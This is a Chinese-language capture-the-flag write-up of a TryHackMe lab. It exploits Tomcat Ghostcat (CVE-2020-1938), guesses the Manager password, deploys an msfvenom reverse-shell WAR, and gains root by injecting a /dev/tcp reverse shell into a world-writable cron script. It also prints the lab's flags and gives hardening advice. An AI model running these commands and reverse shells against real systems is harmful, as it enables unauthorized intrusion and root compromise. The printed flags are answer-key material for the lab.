# THM Tomcat Ghostcat 渗透测试 Writeup

**靶机**: TryHackMe — Tomcat Ghostcat (CVE-2020-1938) 主题靶机  
**IP**: 10.49.170.32  
**日期**: 2026-05-22  
**作者**: yao  
**状态**: ✅ 全部完成 (User + Root)

---

## 目录

1. [摘要](#摘要)
2. [信息收集](#1-信息收集)
3. [Ghostcat 漏洞验证](#2-ghostcat-漏洞验证)
4. [Tomcat Manager 弱口令](#3-tomcat-manager-弱口令)
5. [WAR 部署获取 Shell](#4-war-部署获取-shell)
6. [权限提升 — Cron 任务提权](#5-权限提升--cron-任务提权)
7. [获取 Root Flag](#6-获取-root-flag)
8. [攻击链总结](#攻击链总结)
9. [完整命令参考](#完整命令参考)
10. [安全建议](#安全建议)

---

## 摘要

本靶机为 TryHackMe 授权靶场，目标为获取 User Flag 和 Root Flag。靶机运行 Apache Tomcat 8.5.5，AJP 8009 端口开放。攻击链从 Nmap 扫描发现服务开始，通过 Ghostcat (CVE-2020-1938) 验证 AJP 文件读取能力，利用 Tomcat Manager 弱口令 `tomcat:s3cret` 登录管理界面，部署 JSP reverse shell WAR 文件获取 tomcat 用户权限，发现 `/home/jack/id.sh` 可被任意用户修改且由 root cron 每分钟执行，最终通过修改脚本注入反向 shell 获取 root 权限。

**攻击路径**:  
`Nmap → Ghostcat 验证 → Manager 弱口令 → WAR 部署 → tomcat shell → id.sh (777) + root cron → 修改 id.sh 注入反向 shell → root`

---

## 1. 信息收集

### 1.1 Nmap 扫描

**命令**:
```bash
nmap -Pn -sV --version-light --top-ports 1000 10.49.170.32
```

**结果**:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**分析**:
- 3 个端口开放，形成经典 Tomcat 攻击面
- AJP 8009 端口开放 — Ghostcat (CVE-2020-1938) 潜在入口
- Tomcat 8.5.5 是较老版本，Manager 弱口令是常见突破口
- 网络延迟较高 (RTT ~540ms)

### 1.2 Web 初步枚举

**Tomcat 首页**:
```bash
curl -s http://10.49.170.32:8080/
```

确认是 Apache Tomcat/8.5.5 默认首页，包含标准导航：Documentation、Configuration、Examples。

**Manager 访问测试**:
```bash
curl -sI http://10.49.170.32:8080/manager/html
```

返回 **401 Unauthorized**，需要 Basic Auth 认证。

---

## 2. Ghostcat 漏洞验证

### 2.1 漏洞说明

**CVE-2020-1938** (Ghostcat) 是 Apache Tomcat AJP 协议的严重漏洞，攻击者可通过 AJP 端口读取 webapps 目录下的任意文件，或在某些条件下执行任意代码。

**影响版本**: Tomcat 6.x, 7.x, 8.x, 9.x

### 2.2 漏洞验证

使用 Metasploit `auxiliary/admin/http/tomcat_ghostcat` 模块验证：

**命令**:
```bash
msfconsole -q
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.49.170.32
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

**结果**:
```
[*] Running module against 10.49.170.32
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">
  <display-name>Welcome to Tomcat</display-name>
  <description>Welcome to Tomcat</description>
</web-app>
[+] File contents save to: /home/yao/.msf4/loot/...
```

**结论**: Ghostcat 漏洞 **100% 可利用**，可成功读取 webapps 目录下文件。

### 2.3 路径穿越测试

尝试通过 `../../` 路径穿越读取系统文件：

**测试文件**:
- `/../../conf/tomcat-users.xml`
- `/../conf/tomcat-users.xml`
- `/conf/tomcat-users.xml`

**结果**:
```
HTTP Status 500 - The resource path [//../../conf/tomcat-users.xml] has been normalized to [null] which is not valid
```

**分析**: Tomcat 8.5.5 已包含路径穿越保护，无法通过 `../` 读取 webapps 外的文件。

---

## 3. Tomcat Manager 弱口令

### 3.1 凭据爆破

**命令**:
```bash
for pair in "tomcat:tomcat" "admin:admin" "manager:manager" "tomcat:s3cret"; do
  user=$(echo $pair | cut -d: -f1)
  pass=$(echo $pair | cut -d: -f2)
  code=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" http://10.49.170.32:8080/manager/html)
  echo "[$code] $user:$pass"
done
```

**结果**:
```
[401] tomcat:tomcat
[401] admin:admin
[401] manager:manager
[200] tomcat:s3cret
```

**命中**: `tomcat:s3cret` → HTTP 200

### 3.2 Manager 访问确认

**命令**:
```bash
curl -s -u 'tomcat:s3cret' http://10.49.170.32:8080/manager/html/list
```

确认可正常访问 Tomcat Web Application Manager，可看到已部署的应用列表。

---

## 4. WAR 部署获取 Shell

### 4.1 生成 JSP Reverse Shell WAR

**命令**:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.241.203 LPORT=4444 -f war > shell.war
```

### 4.2 部署 WAR

通过 Manager HTML 界面上传 WAR 文件：

1. 登录 `http://10.49.170.32:8080/manager/html`
2. 使用凭据 `tomcat:s3cret`
3. 在 "Deploy" 区域上传 `shell.war`
4. 指定 Context Path: `/shell`

### 4.3 获取 Shell

**Kali 监听**:
```bash
nc -lvnp 4444
```

**触发 WAR**:
```bash
curl -s http://10.49.170.32:8080/shell/
```

**成功获取 tomcat 用户 shell**:
```
connect to [192.168.241.203] from (UNKNOWN) [10.49.170.32] ...
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ubuntu:/$ id
uid=999(tomcat) gid=999(tomcat) groups=999(tomcat)
```

---

## 5. 权限提升 — Cron 任务提权

### 5.1 家目录枚举

**命令**:
```bash
tomcat@ubuntu:/$ ls -la /home/jack/
```

**输出**:
```
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23 2019 .
drwxr-xr-x 3 root root 4096 Aug 14 2019 ..
-rw------- 1 root root 1476 Aug 14 2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14 2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14 2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14 2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14 2019 id.sh         <-- 777 权限！
drwxr-xr-x 2 jack jack 4096 Aug 14 2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14 2019 .profile
-rw-r--r-- 1 root root   39 May 22 01:53 test.txt      <-- root 拥有！
-rw-rw-r-- 1 jack jack   33 Aug 14 2019 user.txt
-rw------- 1 root root  183 Aug 14 2019 .wget-hsts
```

### 5.2 关键发现

1. **`id.sh` 权限 777** — 任意用户可读写执行
2. **`test.txt` 是 root 拥有** — 说明 root 执行过某些操作
3. **`.bash_history` 是 root 拥有** — root 在这个目录操作过

### 5.3 读取 test.txt

**命令**:
```bash
cat /home/jack/test.txt
```

**结果**:
```
uid=0(root) gid=0(root) groups=0(root)
```

**关键发现**: `test.txt` 内容是 root 的 `id` 输出！这强烈暗示 root 执行过包含 `id > test.txt` 的命令。

### 5.4 读取 id.sh

**命令**:
```bash
cat /home/jack/id.sh
```

**结果**:
```bash
#!/bin/bash
id > test.txt
```

**分析**: `id.sh` 执行 `id` 并将结果写入 `test.txt`。由于 `test.txt` 是 root 拥有的且包含 root 的 id 输出，说明 **root 执行过 `id.sh`**。

### 5.5 发现 Cron 任务

**命令**:
```bash
cat /etc/crontab
```

**结果**:
```
# m h dom mon dow user command
17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * * * * root cd /home/jack && bash id.sh
```

**关键发现**: `* * * * * root cd /home/jack && bash id.sh`

- **每分钟执行一次**
- 以 **root** 身份执行
- 在 `/home/jack` 目录下执行 `bash id.sh`

### 5.6 修改 id.sh 注入反向 Shell

**命令**:
```bash
cat > /home/jack/id.sh << 'EOF'
#!/bin/bash
id > test.txt
bash -i >& /dev/tcp/192.168.241.203/5555 0>&1
EOF
```

**分析**: 由于 `id.sh` 权限是 777，tomcat 用户可以随意修改。当 cron 下次执行时，root 会执行修改后的 `id.sh`，触发反向 shell。

### 5.7 获取 Root Shell

**Kali 监听**:
```bash
nc -lvnp 5555
```

**1 分钟内触发**:
```
connect to [192.168.241.203] from (UNKNOWN) [10.49.170.32] 37528
bash: cannot set terminal process group (1353): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# id
uid=0(root) gid=0(root) groups=0(root)
```

**成功获取 root 权限！**

---

## 6. 获取 Root Flag

### 6.1 读取 User Flag

**命令**:
```bash
cat /home/jack/user.txt
```

**结果**:
```
39400c90bc683a41a8935e4719f181bf
```

### 6.2 读取 Root Flag

**命令**:
```bash
cat /root/root.txt
```

**结果**:
```
d89d5391984c0450a95497153ae7ca3a
```

---

## 攻击链总结

```
                    ┌─────────────────────────────────────┐
                    │         Nmap 扫描                   │
                    │  22/8009/8080 (SSH/AJP/Tomcat)      │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     Ghostcat 验证 (CVE-2020-1938)   │
                    │  AJP 8009 可读取 WEB-INF/web.xml    │
                    │  路径穿越被阻止                      │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     Tomcat Manager 弱口令           │
                    │  tomcat:s3cret                      │
                    │  HTTP 200                           │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     WAR 部署                         │
                    │  msfvenom JSP reverse shell          │
                    │  通过 Manager HTML 界面上传          │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     tomcat 用户 shell                │
                    │  uid=999(tomcat)                     │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     家目录枚举                       │
                    │  /home/jack/id.sh (777 权限)         │
                    │  test.txt (root 拥有, uid=0)         │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     Cron 分析                        │
                    │  * * * * * root bash id.sh           │
                    │  → root 每分钟执行                   │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     修改 id.sh 注入反向 shell        │
                    │  bash -i >& /dev/tcp/.../5555       │
                    └─────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────────────┐
                    │     root 权限                        │
                    │  uid=0(root)                         │
                    │  /root/root.txt                       │
                    │  d89d5391984c0450a95497153ae7ca3a    │
                    └─────────────────────────────────────┘
```

---

## 完整命令参考

### 信息收集
```bash
nmap -Pn -sV --version-light --top-ports 1000 10.49.170.32
curl -s http://10.49.170.32:8080/
curl -sI http://10.49.170.32:8080/manager/html
```

### Ghostcat 验证
```bash
# Metasploit
msfconsole -q
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS 10.49.170.32
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

### Manager 弱口令测试
```bash
for pair in "tomcat:tomcat" "admin:admin" "manager:manager" "tomcat:s3cret"; do
  user=$(echo $pair | cut -d: -f1)
  pass=$(echo $pair | cut -d: -f2)
  code=$(curl -s -o /dev/null -w "%{http_code}" -u "$user:$pass" http://10.49.170.32:8080/manager/html)
  echo "[$code] $user:$pass"
done
```

### WAR 部署
```bash
# 生成 WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.241.203 LPORT=4444 -f war > shell.war

# 通过 Manager HTML 界面上传
# 登录 http://10.49.170.32:8080/manager/html
# 凭据: tomcat:s3cret
# Deploy WAR, Context Path: /shell

# 监听
nc -lvnp 4444

# 触发
curl -s http://10.49.170.32:8080/shell/
```

### 权限提升 — Cron 提权
```bash
# 在 tomcat shell 中
# 1. 确认 cron
cat /etc/crontab

# 2. 修改 id.sh
cat > /home/jack/id.sh << 'EOF'
#!/bin/bash
id > test.txt
bash -i >& /dev/tcp/192.168.241.203/5555 0>&1
EOF

# 3. 在 Kali 监听
nc -lvnp 5555

# 4. 等待 1 分钟内 root shell 触发
# 5. 获取 Root Flag
cat /root/root.txt
```

---

## 安全建议

1. **禁用或保护 Tomcat Manager**
   - 移除生产环境的 Manager 应用
   - 如必须使用，设置强密码（至少 16 位，混合大小写+数字+符号）
   - 限制 Manager 访问 IP（通过 RemoteAddrValve 或防火墙）

2. **禁用 AJP 连接器**
   - 如不需要 AJP，在 `server.xml` 中注释掉 `<Connector port="8009" protocol="AJP/1.3" />`
   - 升级 Tomcat 到安全版本（Ghostcat 已在后续版本修复）

3. **修复 Ghostcat (CVE-2020-1938)**
   - 升级 Tomcat 到 9.0.31、8.5.51、7.0.100 或更高版本
   - 或配置 `secretRequired="true"` 并设置 `secret`

4. **Cron 任务安全**
   - root 执行的脚本必须设置为仅 root 可写（如 `chmod 700`）
   - 避免 cron 执行用户可修改的脚本
   - 定期审计 `/etc/crontab` 和 `/etc/cron.d/` 下的任务

5. **文件权限管理**
   - 禁止设置 777 权限给任何脚本
   - 遵循最小权限原则

6. **Web 应用安全**
   - 限制 WAR 文件部署权限
   - 使用 `manager-script` 角色替代 `manager-gui` 进行自动化部署
   - 分离不同角色的权限，避免同一用户同时拥有 `manager-gui` 和 `manager-script`

---

## 渗透测试状态文件

- `/home/yao/.openclaw/workspace/pentest/target.md` — 目标信息
- `/home/yao/.openclaw/workspace/pentest/findings.md` — 完整发现记录
- `/home/yao/.openclaw/workspace/pentest/writeup-tomcat-ghostcat-20260522.md` — 本 Writeup
- `/home/yao/.openclaw/workspace/pentest/MEMORY.md` — 长期记忆

**原始输出目录**:
- `/home/yao/.openclaw/workspace/pentest/runs/10.49.170.32/thm-recon-20260522-002/` — Nmap 扫描结果
- `/home/yao/.openclaw/workspace/pentest/runs/10.49.170.32/tomcat-enum/` — Manager 枚举, Ghostcat 测试, msf 结果

---

## 靶机状态

- **状态**: ✅ 全部完成
- **获取 Flags**: 2/2 (user.txt + root.txt)
- **总耗时**: ~30 分钟
- **攻击复杂度**: 中（需要 Manager 凭据 + Cron 提权发现）

---

*生成时间: 2026-05-22*  
*工具: OpenClaw + Feishu + Kali Linux + Metasploit + msfvenom + nc*  
*靶机平台: TryHackMe*  
*主题: Tomcat Ghostcat (CVE-2020-1938)*